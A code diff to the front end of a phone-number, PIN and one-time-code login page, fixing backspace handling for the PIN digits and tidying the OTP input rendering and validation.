@@ -194,7 +194,6 @@ input{
       <input class="otp-digit" tabindex="-1">
     </div>
 
-    <!-- Bank-grade hidden OTP capture -->
     <input id="otpBuffer" inputmode="numeric" autocomplete="one-time-code"
            style="position:absolute;opacity:0;pointer-events:none">
 
@@ -237,23 +236,44 @@ function normalizePlan(plan){
   return price?`${name} — ${price}`:name;
 }
 
-/* ===== PIN ===== */
+/* ===== PIN (FIXED DELETE LOGIC) ===== */
 const pins=[...document.querySelectorAll('.pin-digit')];
 let pinValue='';
+
 pins.forEach((el,i)=>{
   el.addEventListener('input',()=>{
     el.value=el.value.replace(/\D/g,'');
     el.classList.toggle('filled',!!el.value);
-    if(el.value&&i<pins.length-1) pins[i+1].focus();
-    pinValue=pins.map(p=>p.value).join('');
-    loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue));
+    if(el.value && i<pins.length-1) pins[i+1].focus();
+    updatePin();
+  });
+
+  el.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'){
+      if(el.value){
+        el.value='';
+        el.classList.remove('filled');
+      }else if(i>0){
+        pins[i-1].focus();
+        pins[i-1].value='';
+        pins[i-1].classList.remove('filled');
+      }
+      e.preventDefault();
+      updatePin();
+    }
   });
 });
+
+function updatePin(){
+  pinValue=pins.map(p=>p.value).join('');
+  loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue));
+}
 
 /* ===== PHONE ===== */
 const phone=document.getElementById('phone');
 const phoneError=document.getElementById('phoneError');
 const loginBtn=document.getElementById('loginBtn');
+
 function validatePhone(){
   const d=phone.value.replace('+263','');
   if(!/^7\d{8}$/.test(d)){phoneError.innerText='Input 9-digit number starting with 7';return false}
@@ -285,18 +305,14 @@ const otpStatus=document.getElementById('otpStatus');
 let timer=null,seconds=120;
 
 function renderOtp(v){
-  dots.forEach((d,i)=>{
-    d.classList.toggle('filled',!!v[i]);
-  });
+  dots.forEach((d,i)=>d.classList.toggle('filled',!!v[i]));
   confirmBtn.disabled=!/^\d{5}$/.test(v);
   otpWarning.style.display=/^\d{5}$/.test(v)?'none':'block';
 }
-
 buffer.addEventListener('input',()=>{
   buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);
   renderOtp(buffer.value);
 });
-
 dots.forEach(d=>d.addEventListener('click',()=>buffer.focus()));
 
 function startCountdown(){
